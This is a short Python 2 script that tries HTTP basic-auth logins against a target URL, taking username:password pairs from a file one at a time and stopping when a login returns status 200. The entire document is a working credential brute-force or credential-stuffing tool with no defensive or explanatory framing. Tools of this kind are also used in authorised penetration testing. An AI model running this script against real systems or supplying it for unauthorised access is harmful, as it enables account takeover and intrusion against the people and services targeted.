#!/usr/bin/env python
import sys
import requests

with open(sys.argv[1]) as f:
	for line in f:
		c = line.strip('\n').split(":")
		print "testing "+c[0]+":"+ c[1]
		r = requests.get(sys.argv[2], auth=(c[0], c[1]))
		if r.status_code == 200:
			print "Found valid credentials \"" + line.strip('\n') + "\""
			raise sys.exit()
